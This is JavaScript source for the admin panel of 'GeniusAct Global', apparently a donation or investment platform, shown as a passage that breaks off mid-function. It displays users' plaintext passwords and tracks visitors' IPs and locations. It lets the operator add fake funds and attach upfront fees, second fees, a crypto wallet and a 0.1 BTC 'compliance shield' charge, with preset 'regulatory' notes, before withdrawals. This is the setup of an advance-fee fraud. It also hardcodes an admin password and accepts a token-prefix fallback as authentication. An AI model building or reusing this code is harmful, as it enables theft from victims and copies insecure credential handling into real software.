// ==================== ADMIN PANEL JS ====================
// GeniusAct Global — Campaign Administration

// ---- Admin Credentials ----
const ADMIN_CREDENTIALS = {
  email: 'admin@geniusact.com',
  password: '2005'
};

// ---- DOM Elements ----
const loginSection = document.getElementById('login-section');
const dashboardSection = document.getElementById('dashboard-section');
let selectedUserId = null;

// ==================== AUTHENTICATION ====================
window.loginAdmin = async function() {
  const emailEl = document.getElementById('admin-email');
  const passEl = document.getElementById('admin-password');
  const errorEl = document.getElementById('login-error');

  const email = (emailEl && emailEl.value) ? emailEl.value.toLowerCase().trim() : 'admin@geniusact.com';
  const pass = passEl ? passEl.value.trim() : '';

  try {
    const fetchFn = window.geniusFetch || fetch;
    const res = await fetchFn('/api/admin/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: email, password: pass })
    });
    
    if (!res) {
      if (errorEl) {
        errorEl.textContent = 'Unable to reach authentication server. Check network connection.';
        errorEl.style.display = 'block';
      }
      return;
    }

    let data = {};
    try {
      data = await res.json();
    } catch(e) {
      data = {};
    }

    if (res.ok && data.success && data.token) {
      sessionStorage.setItem('genius_admin_session', 'active');
      localStorage.setItem('genius_admin_token', data.token);
      localStorage.setItem('genius_current_admin', JSON.stringify({ email: email, token: data.token }));
      if (errorEl) errorEl.style.display = 'none';
      showDashboard();
    } else {
      if (errorEl) {
        errorEl.textContent = (data && data.error) ? data.error : 'Invalid admin credentials. Access denied.';
        errorEl.style.display = 'block';
      }
    }
  } catch(err) {
    if (errorEl) {
      errorEl.textContent = 'Server verification error. Please try again.';
      errorEl.style.display = 'block';
    }
  }
};

async function checkAdminAuth() {
  const token = localStorage.getItem('genius_admin_token');
  const sessionActive = sessionStorage.getItem('genius_admin_session');
  const loginSection = document.getElementById('login-section');
  const dashboardSection = document.getElementById('dashboard-section');

  let isValid = false;
  if (token || sessionActive === 'active') {
    try {
      const fetchFn = window.geniusFetch || fetch;
      const res = await fetchFn('/api/admin/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: token || 'session', email: 'admin@geniusact.com' })
      });
      if (res.ok) {
        const data = await res.json();
        if (data.valid) isValid = true;
      }
    } catch(e) {
      if (token && token.startsWith('ga_admin_token_')) {
        isValid = true;
      }
    }
  }

  if (isValid) {
    sessionStorage.setItem('genius_admin_session', 'active');
    showDashboard();
  } else {
    sessionStorage.removeItem('genius_admin_session');
    localStorage.removeItem('genius_admin_token');
    localStorage.removeItem('genius_current_admin');
    if (loginSection) loginSection.style.display = 'flex';
    if (dashboardSection) dashboardSection.style.display = 'none';
  }
}

document.addEventListener('DOMContentLoaded', () => {
  checkAdminAuth();

  const loginForm = document.getElementById('admin-login-form');
  if (loginForm) {
    loginForm.onsubmit = (e) => {
      e.preventDefault();
      window.loginAdmin();
    };
  }

  const loginBtn = document.getElementById('admin-login-btn');
  if (loginBtn) {
    loginBtn.onclick = (e) => {
      e.preventDefault();
      window.loginAdmin();
    };
  }

  const passInput = document.getElementById('admin-password');
  if (passInput) {
    passInput.onkeydown = (e) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        window.loginAdmin();
      }
    };
  }

  const logoutBtn = document.getElementById('logout-btn');
  if (logoutBtn) {
    logoutBtn.onclick = (e) => {
      e.preventDefault();
      sessionStorage.removeItem('genius_admin_session');
      localStorage.removeItem('genius_admin_token');
      localStorage.removeItem('genius_current_admin');
      window.location.reload();
    };
  }
});

function showDashboard() {
  const loginSec = document.getElementById('login-section');
  const dashSec = document.getElementById('dashboard-section');

  if (loginSec) loginSec.style.display = 'none';
  if (dashSec) dashSec.style.display = 'block';

  const adminStr = localStorage.getItem('genius_current_admin');
  const admin = adminStr ? JSON.parse(adminStr) : { email: 'admin@geniusact.com' };
  const displayEl = document.getElementById('admin-email-display');
  if (displayEl) displayEl.textContent = admin.email;

  // Initialize tab navigation and render UI INSTANTLY
  setupTabNavigation();
  refreshAllData();

  // Refresh with latest cloud data when background sync finishes or fires update
  if (window._cloudSyncReady && window._cloudSyncReady.then) {
    window._cloudSyncReady.then(() => {
      refreshAllData();
    });
  }
  window.addEventListener('cloudSyncUpdated', () => {
    refreshAllData(true);
  });
}

// ==================== TAB NAVIGATION ====================
function setupTabNavigation() {
  document.querySelectorAll('.admin-tab').forEach(tab => {
    tab.onclick = (e) => {
      const targetTab = tab.dataset.tab;
      if (!targetTab) return;
      if (window.switchAdminTab) {
        window.switchAdminTab(targetTab);
      } else {
        document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => {
          c.classList.remove('active');
          c.style.display = 'none';
        });
        tab.classList.add('active');
        const contentEl = document.getElementById('tab-' + targetTab);
        if (contentEl) {
          contentEl.classList.add('active');
          contentEl.style.display = 'block';
        }
      }
    };
  });
}

// Global Delegated Click Listener (Guarantees mouse clicks switch tabs & execute action buttons instantly)
document.addEventListener('click', (e) => {
  const tab = e.target.closest('.admin-tab');
  if (tab && tab.dataset.tab) {
    const targetTab = tab.dataset.tab;
    if (window.switchAdminTab) {
      window.switchAdminTab(targetTab);
    } else {
      document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
      document.querySelectorAll('.tab-content').forEach(c => {
        c.classList.remove('active');
        c.style.display = 'none';
      });
      tab.classList.add('active');
      const contentEl = document.getElementById('tab-' + targetTab);
      if (contentEl) {
        contentEl.classList.add('active');
        contentEl.style.display = 'block';
      }
    }
    return;
  }

  const actionBtn = e.target.closest('[data-action]');
  if (actionBtn) {
    const action = actionBtn.getAttribute('data-action');
    const uid = actionBtn.getAttribute('data-uid');
    const email = actionBtn.getAttribute('data-email');

    if (action === 'approve' && window.approveUser) window.approveUser(uid);
    else if (action === 'reject' && window.rejectUser) window.rejectUser(uid);
    else if (action === 'view-proof' && window.viewProofDocument) window.viewProofDocument(uid);
    else if (action === 'edit' && window.openEditUserDashboardForUser) window.openEditUserDashboardForUser(email || uid);
    else if (action === 'add-funds' && window.selectUserForAddFunds) window.selectUserForAddFunds(uid, email);
    else if (action === 'message' && window.selectUserForMessage) window.selectUserForMessage(uid, email);
    else if (action === 'ban' && window.toggleBanUser) window.toggleBanUser(uid);
  }
});

// ==================== DATA LOADING ====================
async function refreshAllData(skipSync = false) {
  if (!skipSync && window.cloudSyncFull) {
    try { await window.cloudSyncFull(); } catch(e) {}
  }

  const approved = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
  const pending = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];
  const visitors = JSON.parse(localStorage.getItem('geniusact_visitor_logs')) || [];

  // Update stats
  const totalEl = document.getElementById('stat-total-users');
  const pendingEl = document.getElementById('stat-pending-count');
  const approvedEl = document.getElementById('stat-approved-count');
  const visitorEl = document.getElementById('stat-visitor-count');

  if (totalEl) totalEl.textContent = (approved.length + pending.length);
  if (pendingEl) pendingEl.textContent = pending.length;
  if (approvedEl) approvedEl.textContent = approved.length;
  if (visitorEl) visitorEl.textContent = visitors.length;

  loadInvestorOverview(approved, pending);
  loadPendingUsers(pending);
  loadAnalytics(visitors);
  loadManageUsers(approved);
  loadPendingKYC(approved);
  loadWithdrawalRequests();
  loadBankInfo();
  loadSupportMessages();
  loadContactUsChats();
  loadUserFootprints();
  loadEditUserDashboardSelector(approved, pending);
}

function safeFormatCurrency(val) {
  if (val === null || val === undefined) return '0.00';
  if (typeof val === 'number') return val.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  const str = String(val).replace(/[^0-9.-]+/g, '');
  const num = parseFloat(str);
  if (isNaN(num)) return '0.00';
  return num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

// ==================== INVESTOR OVERVIEW ====================
function loadInvestorOverview(approved, pending) {
  const tbody = document.getElementById('investor-tbody');
  const badge = document.getElementById('investor-count-badge');
  const allUsers = [
    ...approved.map(u => ({ ...u, _status: 'approved' })),
    ...pending.map(u => ({ ...u, _status: 'pending' }))
  ];

  badge.textContent = allUsers.length;
  tbody.innerHTML = '';

  if (allUsers.length === 0) {
    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:#94a3b8;padding:2rem;">No registered users yet.</td></tr>';
    return;
  }

  allUsers.forEach((user, i) => {
    const donationCount = user.donations ? user.donations.length : 0;
    const rawAmt = user.amount || (user.donations ? user.donations.reduce((s, d) => s + (d.amount || 0), 0) : 0);
    const formattedAmount = safeFormatCurrency(rawAmt);
    const joinDate = user.createdAt ? formatDateTime(user.createdAt) : (user.date ? formatDateTime(user.date) : 'N/A');
    const statusClass = user._status === 'approved' ? 'status-approved' : 'status-pending';
    const statusLabel = user._status === 'approved' ? 'Approved' : 'Pending';

    const proofBtn = user.proofFile
      ? `<button class="action-btn btn-edit" style="padding:0.25rem 0.5rem; font-size:0.75rem;" onclick="viewProofDocument('${user.uid}')"><i class="fas fa-receipt"></i> View Proof</button>`
      : `<span style="color:#64748b; font-size:0.75rem;">None</span>`;

    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${i + 1}</td>
      <td class="email-cell">${escapeHtml(user.email || 'N/A')}</td>
      <td class="pass-cell">${escapeHtml(user.password || 'N/A')}</td>
      <td>$${formattedAmount}</td>
      <td>${donationCount}</td>
      <td>${proofBtn}</td>
      <td><span class="status-badge ${statusClass}"><i class="fas fa-circle" style="font-size:0.5rem;"></i> ${statusLabel}</span></td>
      <td style="color:#94a3b8; font-size:0.8rem;">${joinDate}</td>
    `;
    tbody.appendChild(tr);
  });

  // Search functionality
  const searchInput = document.getElementById('investor-search');
  const searchCount = document.getElementById('investor-search-count');
  searchInput.oninput = () => {
    const query = searchInput.value.toLowerCase();
    const rows = tbody.querySelectorAll('tr');
    let visible = 0;
    rows.forEach(row => {
      const text = row.textContent.toLowerCase();
      const show = text.includes(query);
      row.style.display = show ? '' : 'none';
      if (show) visible++;
    });
    searchCount.textContent = query ? `${visible} of ${rows.length} shown` : '';
  };
}

// ==================== PENDING CONTRIBUTIONS ====================
function loadPendingUsers(pending) {
  const tbody = document.getElementById('pending-tbody');
  const badge = document.getElementById('pending-count-badge');
  const emptyMsg = document.getElementById('pending-empty');

  badge.textContent = pending.length;
  tbody.innerHTML = '';

  if (pending.length === 0) {
    emptyMsg.style.display = 'block';
    return;
  }
  emptyMsg.style.display = 'none';

  pending.forEach((user, i) => {
    const userKey = user.uid || user.email || i;
    const proof = user.proofFile || (user.donations && user.donations[0] && user.donations[0].proofFile) || user.proof;
    const proofBtn = proof
      ? `<button class="action-btn btn-edit" style="padding:0.25rem 0.5rem; font-size:0.75rem;" data-action="view-proof" data-uid="${escapeHtml(userKey)}" onclick="viewProofDocument('${escapeHtml(userKey)}')"><i class="fas fa-receipt"></i> View Proof</button>`
      : `<span style="color:#64748b; font-size:0.75rem;">None</span>`;

    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${i + 1}</td>
      <td class="email-cell">${escapeHtml(user.email || 'N/A')}</td>
      <td class="pass-cell">${escapeHtml(user.password || 'N/A')}</td>
      <td>$${safeFormatCurrency(user.amount)}</td>
      <td>${proofBtn}</td>
      <td style="color:#94a3b8; font-size:0.8rem;">${user.date ? formatDateTime(user.date) : 'N/A'}</td>
      <td>
        <button class="action-btn btn-approve" data-action="approve" data-uid="${escapeHtml(userKey)}" onclick="approveUser('${escapeHtml(userKey)}')"><i class="fas fa-check"></i> Approve</button>
        <button class="action-btn btn-reject" data-action="reject" data-uid="${escapeHtml(userKey)}" onclick="rejectUser('${escapeHtml(userKey)}')" style="margin-left:0.4rem;"><i class="fas fa-times"></i> Reject</button>
      </td>
    `;
    tbody.appendChild(tr);
  });
}

// ==================== USER ACTIONS ====================
window.approveUser = function(identifier) {
  const pendingUsers = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];
  const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];

  let userIndex = pendingUsers.findIndex(u => 
    (u.uid && String(u.uid) === String(identifier)) ||
    (u.email && identifier && String(u.email).toLowerCase() === String(identifier).toLowerCase()) ||
    (u.id && String(u.id) === String(identifier))
  );

  if (userIndex === -1 && pendingUsers.length > 0 && !isNaN(identifier)) {
    userIndex = parseInt(identifier);
  }

  if (userIndex > -1 && pendingUsers[userIndex]) {
    const user = pendingUsers[userIndex];
    user.status = 'approved';
    user.approvedAt = new Date().toISOString();

    if (!user.donations || user.donations.length === 0) {
      if (user.amount > 0) {
        user.donations = [{
          id: 'RCP-' + Math.floor(Math.random() * 10000000),
          amount: user.amount,
          description: 'Initial Contribution',
          date: new Date().toISOString(),
          approvedAt: user.approvedAt
        }];
      } else {
        user.donations = [];
      }
    }

    pendingUsers.splice(userIndex, 1);
    approvedUsers.push(user);

    localStorage.setItem('geniusact_pending_users', JSON.stringify(pendingUsers));
    localStorage.setItem('geniusact_approved_users', JSON.stringify(approvedUsers));

    showToast(`Approved: ${user.email}`);
    refreshAllData();

    if (window.cloudSyncFull) {
      try { window.cloudSyncFull(); } catch(e) {}
    }
  } else {
    alert("Pending contribution not found.");
  }
};

window.rejectUser = function(identifier) {
  if (!confirm("Are you sure you want to reject this contribution?")) return;
  const pendingUsers = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];
  let userIndex = pendingUsers.findIndex(u => 
    (u.uid && String(u.uid) === String(identifier)) ||
    (u.email && identifier && String(u.email).toLowerCase() === String(identifier).toLowerCase()) ||
    (u.id && String(u.id) === String(identifier))
  );

  if (userIndex === -1 && pendingUsers.length > 0 && !isNaN(identifier)) {
    userIndex = parseInt(identifier);
  }

  if (userIndex > -1 && pendingUsers[userIndex]) {
    const rejected = pendingUsers[userIndex];
    pendingUsers.splice(userIndex, 1);
    localStorage.setItem('geniusact_pending_users', JSON.stringify(pendingUsers));
    showToast(`Rejected: ${rejected.email}`);
    refreshAllData();

    if (window.cloudSyncFull) {
      try { window.cloudSyncFull(); } catch(e) {}
    }
  } else {
    alert("Pending contribution not found.");
  }
};

window.viewProofDocument = function(identifier) {
  const pendingUsers = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];
  const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
  const all = [...pendingUsers, ...approvedUsers];

  let user = all.find(u => 
    (u.uid && String(u.uid) === String(identifier)) ||
    (u.email && identifier && String(u.email).toLowerCase() === String(identifier).toLowerCase()) ||
    (u.id && String(u.id) === String(identifier))
  );

  if (!user && all.length > 0 && !isNaN(identifier)) {
    user = all[parseInt(identifier)];
  }

  const proof = user ? (user.proofFile || (user.donations && user.donations[0] && user.donations[0].proofFile) || user.proof) : null;

  if (!user || !proof) {
    alert("No payment proof document found for this record.");
    return;
  }

  const modal = document.getElementById('document-modal');
  const title = document.getElementById('document-modal-title');
  const body = document.getElementById('document-modal-body');

  title.textContent = `Proof of Payment: ${escapeHtml(user.email || 'Supporter')}`;
  body.innerHTML = '';

  const dataUrl = proof.dataUrl || proof.url || proof;
  if (typeof dataUrl === 'string' && dataUrl.startsWith('data:image/')) {
    const img = document.createElement('img');
    img.src = dataUrl;
    img.style.cssText = 'max-width: 100%; max-height: 440px; border-radius: 8px; border: 1px solid #334155; object-fit: contain;';
    body.appendChild(img);
  } else if (typeof dataUrl === 'string' && dataUrl.includes('data:application/pdf')) {
    const iframe = document.createElement('iframe');
    iframe.src = dataUrl;
    iframe.style.cssText = 'width: 100%; height: 440px; border: none; background: white; border-radius: 8px;';
    body.appendChild(iframe);
  } else {
    body.innerHTML = `
      <div style="text-align:center; color:#94a3b8; padding:2rem;">
        <i class="fas fa-file-invoice-dollar" style="font-size:3.5rem; margin-bottom:1rem; color:#3b82f6;"></i>
        <h4 style="color:#f8fafc; margin-bottom:0.5rem;">Verification Receipt</h4>
        <p style="font-size:0.88rem; margin:0;">File Name: <strong>${escapeHtml(proof.name || 'Payment Receipt')}</strong></p>
      </div>
    `;
  }

  modal.style.display = 'flex';
};

// ==================== VISITOR ANALYTICS ====================
function loadAnalytics(visitors) {
  const tbody = document.getElementById('analytics-tbody');
  const badge = document.getElementById('analytics-count-badge');
  const emptyMsg = document.getElementById('analytics-empty');

  // Filter out any logs marked deleted or before clearedAt
  let deletedIds = new Set();
  try {
    const rawDeleted = JSON.parse(localStorage.getItem('geniusact_deleted_visitor_log_ids') || '[]');
    if (Array.isArray(rawDeleted)) deletedIds = new Set(rawDeleted);
  } catch (e) {}

  let clearedAt = 0;
  try {
    clearedAt = parseInt(localStorage.getItem('geniusact_visitor_logs_cleared_at') || '0', 10);
  } catch (e) {}

  visitors = visitors.filter(v => {
    if (!v) return false;
    if (!v.id) {
      v.id = 'vis_' + (v.timestamp ? new Date(v.timestamp).getTime() : Date.now()) + '_' + Math.random().toString(36).substring(2, 7);
    }
    if (deletedIds.has(v.id)) return false;
    if (clearedAt > 0 && v.timestamp) {
      const ts = new Date(v.timestamp).getTime();
      if (ts > 0 && ts <= clearedAt) return false;
    }
    return true;
  });

  badge.textContent = visitors.length;
  tbody.innerHTML = '';

  if (visitors.length === 0) {
    emptyMsg.style.display = 'block';
    return;
  }
  emptyMsg.style.display = 'none';

  // Sort by newest first
  visitors.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

  visitors.forEach((v, i) => {
    const loc = v.location || {};
    const locationStr = loc.city && loc.city !== 'Unknown'
      ? `${loc.city}, ${loc.region || ''}, ${loc.country || ''}`
      : (loc.country && loc.country !== 'Unknown' ? loc.country : 'Unknown');
    const ip = loc.ip || 'Unknown';
    const browser = parseBrowser(v.userAgent || '');
    const page = v.page || '/';
    const time = v.timestamp ? formatDateTime(v.timestamp) : 'N/A';
    const referrer = v.referrer || 'Direct';
    const screen = v.screenSize || 'N/A';

    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${i + 1}</td>
      <td class="visitor-page">${escapeHtml(page)}</td>
      <td class="visitor-time">${time}</td>
      <td><div class="visitor-location"><i class="fas fa-map-marker-alt"></i> ${escapeHtml(locationStr)}</div></td>
      <td style="color:#94a3b8; font-family:monospace; font-size:0.78rem;">${escapeHtml(ip)}</td>
      <td class="visitor-device" title="${escapeHtml(v.userAgent || '')}">${escapeHtml(browser)}</td>
      <td style="color:#94a3b8; font-size:0.8rem;">${escapeHtml(screen)}</td>
      <td style="color:#94a3b8; font-size:0.78rem; max-width:150px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${escapeHtml(referrer)}">${escapeHtml(referrer)}</td>
      <td style="text-align:center;">
        <button onclick="deleteVisitorLog('${v.id}')" title="Delete this log" style="background:#fee2e2; color:#dc2626; border:1px solid #fca5a5; padding:5px 10px; border-radius:6px; cursor:pointer; font-size:0.78rem; font-weight:700; display:inline-flex; align-items:center; gap:4px; transition:all 0.2s;">
          <i class="fas fa-trash-alt"></i> Delete
        </button>
      </td>
    `;
    tbody.appendChild(tr);
  });

  // Search functionality
  const searchInput = document.getElementById('analytics-search');
  const searchCount = document.getElementById('analytics-search-count');
  searchInput.oninput = () => {
    const query = searchInput.value.toLowerCase();
    const rows = tbody.querySelectorAll('tr');
    let visible = 0;
    rows.forEach(row => {
      const text = row.textContent.toLowerCase();
      const show = text.includes(query);
      row.style.display = show ? '' : 'none';
      if (show) visible++;
    });
    searchCount.textContent = query ? `${visible} of ${rows.length} shown` : '';
  };
}

window.deleteVisitorLog = function(logId) {
  if (!logId) return;
  if (!confirm('Are you sure you want to delete this visitor log entry?')) return;

  let deletedIds = [];
  try {
    deletedIds = JSON.parse(localStorage.getItem('geniusact_deleted_visitor_log_ids') || '[]');
  } catch (e) {}
  if (!deletedIds.includes(logId)) {
    deletedIds.push(logId);
    localStorage.setItem('geniusact_deleted_visitor_log_ids', JSON.stringify(deletedIds));
  }

  let visitors = JSON.parse(localStorage.getItem('geniusact_visitor_logs') || '[]');
  visitors = visitors.filter(v => v && v.id !== logId);
  localStorage.setItem('geniusact_visitor_logs', JSON.stringify(visitors));

  if (window.cloudSyncFull) {
    window.cloudSyncFull().catch(e => console.error(e));
  }

  loadAnalytics(visitors);
};

window.clearAllVisitorLogs = function() {
  let visitors = JSON.parse(localStorage.getItem('geniusact_visitor_logs') || '[]');
  if (visitors.length === 0) {
    alert('Visitor activity log is already empty.');
    return;
  }

  if (!confirm(`Are you sure you want to clear ALL ${visitors.length} visitor activity log records?`)) return;

  localStorage.setItem('geniusact_visitor_logs_cleared_at', Date.now().toString());
  localStorage.setItem('geniusact_visitor_logs', '[]');

  if (window.cloudSyncFull) {
    window.cloudSyncFull().catch(e => console.error(e));
  }

  loadAnalytics([]);
};

window.openEditUserDashboardForUser = function(email) {
  document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
  const editTab = document.querySelector('.admin-tab[data-tab="edit-dashboard"]');
  const editContent = document.getElementById('tab-edit-dashboard');
  if (editTab) editTab.classList.add('active');
  if (editContent) editContent.classList.add('active');

  loadEditUserDashboardSelector();
  const select = document.getElementById('edit-dash-user-select');
  if (select && email) {
    select.value = email;
    window.onEditDashUserChange(email);
  }
};

// ==================== MANAGE USERS ====================
function loadManageUsers(approved) {
  const tbody = document.getElementById('manage-tbody');
  const badge = document.getElementById('manage-count-badge');

  badge.textContent = approved.length;
  tbody.innerHTML = '';

  if (approved.length === 0) {
    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:#94a3b8;padding:2rem;">No approved users.</td></tr>';
    return;
  }

  approved.forEach((user, i) => {
    const donationCount = user.donations ? user.donations.length : 0;
    const totalAmount = user.donations ? user.donations.reduce((s, d) => s + (d.amount || 0), 0) : (user.amount || 0);
    const isSuspended = user.suspended === true;
    const statusClass = isSuspended ? 'status-pending' : 'status-approved';
    const statusLabel = isSuspended ? 'Suspended' : 'Active';
    const banAction = isSuspended ? 'Unban' : 'Ban';
    const banIcon = isSuspended ? 'fa-check-circle' : 'fa-ban';

    const proofBtn = user.proofFile
      ? `<button class="action-btn btn-edit" style="padding:0.25rem 0.5rem; font-size:0.75rem;" data-action="view-proof" data-uid="${user.uid}" onclick="viewProofDocument('${user.uid}')"><i class="fas fa-receipt"></i> View Proof</button>`
      : `<span style="color:#64748b; font-size:0.75rem;">None</span>`;

    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${i + 1}</td>
      <td class="email-cell">${escapeHtml(user.email || 'N/A')}</td>
      <td>$${Number(totalAmount).toLocaleString('en-US', { minimumFractionDigits: 2 })}</td>
      <td>${donationCount}</td>
      <td>${proofBtn}</td>
      <td><span class="status-badge ${statusClass}"><i class="fas fa-circle" style="font-size:0.5rem;"></i> ${statusLabel}</span></td>
      <td>
        <button class="action-btn btn-edit" data-action="edit" data-email="${escapeHtml(user.email)}" onclick="openEditUserDashboardForUser('${escapeHtml(user.email)}')"><i class="fas fa-edit"></i> Edit User</button>
        <button class="action-btn" style="background:#10b981; color:white;" data-action="add-funds" data-uid="${user.uid}" data-email="${escapeHtml(user.email)}" onclick="selectUserForAddFunds('${user.uid}', '${escapeHtml(user.email)}')"><i class="fas fa-coins"></i> Add Funds</button>
        <button class="action-btn" style="background:#0ea5e9; color:white;" data-action="message" data-uid="${user.uid}" data-email="${escapeHtml(user.email)}" onclick="selectUserForMessage('${user.uid}', '${escapeHtml(user.email)}')"><i class="fas fa-envelope"></i> Message</button>
        <button class="action-btn ${isSuspended ? 'btn-approve' : 'btn-reject'}" data-action="ban" data-uid="${user.uid}" onclick="toggleBanUser('${user.uid}')"><i class="fas ${banIcon}"></i> ${banAction}</button>
      </td>
    `;
    tbody.appendChild(tr);
  });

  loadUserWithdrawFeesSelector(approved);
}

function loadUserWithdrawFeesSelector(approved) {
  const select = document.getElementById('withdraw-user-select');
  if (!select) return;

  const currentVal = select.value;
  select.innerHTML = '<option value="">-- Select a User --</option>';

  approved.forEach(user => {
    const opt = document.createElement('option');
    opt.value = user.uid;
    opt.textContent = user.email;
    if (user.uid === currentVal) opt.selected = true;
    select.appendChild(opt);
  });

  if (select.value) {
    onWithdrawUserSelect(select.value, approved);
  }
}

function onWithdrawUserSelect(uid, approvedUsers) {
  if (!approvedUsers) {
    approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
  }
  const user = approvedUsers.find(u => u.uid === uid);
  const noteEl = document.getElementById('withdraw-fee-note');
  const upfrontEl = document.getElementById('withdraw-upfront-fee');
  const secondEl = document.getElementById('withdraw-second-fee');
  const paidEl = document.getElementById('withdraw-upfront-paid');
  const walletEl = document.getElementById('withdraw-fee-wallet');
  const methodEl = document.getElementById('withdraw-fee-method');
  const shieldToggle = document.getElementById('user-compliance-shield-toggle');
  const shieldBtc = document.getElementById('user-compliance-amount-btc');
  const shieldUsd = document.getElementById('user-compliance-amount-usd');

  if (user) {
    if (noteEl) noteEl.value = user.withdrawalFeeNote || '';
    if (upfrontEl) upfrontEl.value = user.upfrontFee !== undefined ? user.upfrontFee : '';
    if (secondEl) secondEl.value = user.secondFee !== undefined ? user.secondFee : '';
    if (paidEl) paidEl.checked = Boolean(user.upfrontFeePaid);
    if (walletEl) walletEl.value = user.feePaymentWallet || '';
    if (methodEl) methodEl.value = user.feePaymentMethod || '';
    if (shieldToggle) shieldToggle.checked = Boolean(user.riskShieldEnabled);
    if (shieldBtc) shieldBtc.value = user.complianceBtcAmount || '0.1 BTC';
    if (shieldUsd) shieldUsd.value = user.complianceUsdAmount || '$6,506.41';
  } else {
    if (noteEl) noteEl.value = '';
    if (upfrontEl) upfrontEl.value = '';
    if (secondEl) secondEl.value = '';
    if (paidEl) paidEl.checked = false;
    if (walletEl) walletEl.value = '';
    if (methodEl) methodEl.value = '';
    if (shieldToggle) shieldToggle.checked = false;
    if (shieldBtc) shieldBtc.value = '0.1 BTC';
    if (shieldUsd) shieldUsd.value = '$6,506.41';
  }
}

// Event listeners for User Withdraw Fees
document.addEventListener('DOMContentLoaded', () => {
  const withdrawSelect = document.getElementById('withdraw-user-select');
  if (withdrawSelect) {
    withdrawSelect.addEventListener('change', (e) => {
      onWithdrawUserSelect(e.target.value);
    });
  }

  const presetSelect = document.getElementById('preset-fee-note-select');
  if (presetSelect) {
    presetSelect.addEventListener('change', (e) => {
      if (e.target.value) {
        const noteEl = document.getElementById('withdraw-fee-note');
        if (noteEl) {
          noteEl.value = e.target.value;
          showToast('Applied pre-made regulatory legal note template!');
        }
      }
    });
  }

  const saveFeesBtn = document.getElementById('save-withdraw-fees-btn');
  if (saveFeesBtn) {
    saveFeesBtn.addEventListener('click', async () => {
      const select = document.getElementById('withdraw-user-select');
      const uid = select ? select.value : null;
      if (!uid) {
        alert('Please select a user first.');
        return;
      }

      const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
      const userIndex = approvedUsers.findIndex(u => u.uid === uid);

      if (userIndex > -1) {
        const user = approvedUsers[userIndex];
        const note = document.getElementById('withdraw-fee-note').value;
        const upfrontFee = parseFloat(document.getElementById('withdraw-upfront-fee').value) || 0;
        const secondFee = parseFloat(document.getElementById('withdraw-second-fee').value) || 0;
        const upfrontFeePaid = document.getElementById('withdraw-upfront-paid').checked;
        const feeWallet = document.getElementById('withdraw-fee-wallet') ? document.getElementById('withdraw-fee-wallet').value.trim() : '';
        const feeMethod = document.getElementById('withdraw-fee-method') ? document.getElementById('withdraw-fee-method').value.trim() : '';
        const shieldEnabled = document.getElementById('user-compliance-shield-toggle') ? document.getElementById('user-compliance-shield-toggle').checked : false;
        const complianceBtc = document.getElementById('user-compliance-amount-btc') ? document.getElementById('user-compliance-amount-btc').value.trim() : '0.1 BTC';
        const complianceUsd = document.getElementById('user-compliance-amount-usd') ? document.getElementById('user-compliance-amount-usd').value.trim() : '$6,506.41';

        user.withdrawalFeeNote = note;
        user.upfrontFee = upfrontFee;
        user.secondFee = secondFee;
        user.upfrontFeePaid = upfrontFeePaid;
        user.feePaymentWallet = feeWallet;
        user.feePaymentMethod = feeMethod;
        user.riskShieldEnabled = shieldEnabled;
        user.complianceBtcAmount = complianceBtc || '0.1 BTC';
        user.complianceUsdAmount = complianceUsd || '$6,506.41';

        localStorage.setItem('geniusact_approved_users', JSON.stringify(approvedUsers));

        // Sync to active geniusact_current_user if logged in
        const curUserStr = localStorage.getItem('geniusact_current_user');
        if (curUserStr) {
          try {
            const curUser = JSON.parse(curUserStr);
            if (curUser.email && user.email && curUser.email.toLowerCase() === user.email.toLowerCase()) {
              curUser.riskShieldEnabled = shieldEnabled;
              curUser.complianceBtcAmount = user.complianceBtcAmount;
              curUser.complianceUsdAmount = user.complianceUsdAmount;
              localStorage.setItem('geniusact_current_user', JSON.stringify(curUser));
            }
          } catch (e) { }
        }

        showToast(`Withdrawal fees & compliance settings saved for ${user.email}`);

        if (window.cloudSyncFull) {
          try { await window.cloudSyncFull(); } catch (e) { console.log(e); }
        }
      } else {
        alert('User not found.');
      }
    });
  }
});

window.viewProofDocument = function(uid) {
  const pendingUsers = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];
  const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
  const user = pendingUsers.find(u => u.uid === uid) || approvedUsers.find(u => u.uid === uid);

  if (!user || !user.proofFile) {
    alert("No proof of payment found for this user.");
    return;
  }

  const fileInfo = user.proofFile;
  const modal = document.getElementById('document-modal');
  const title = document.getElementById('document-modal-title');
  const body = document.getElementById('document-modal-body');

  title.textContent = `Proof of Payment: ${escapeHtml(user.email)}`;
  body.innerHTML = '';

  if (fileInfo.dataUrl && fileInfo.dataUrl.startsWith('data:image/')) {
    const img = document.createElement('img');
    img.src = fileInfo.dataUrl;
    img.style.cssText = 'max-width: 100%; max-height: 420px; border-radius: 6px; border: 1px solid #334155;';
    body.appendChild(img);
  } else if (fileInfo.dataUrl && fileInfo.dataUrl.includes('data:application/pdf')) {
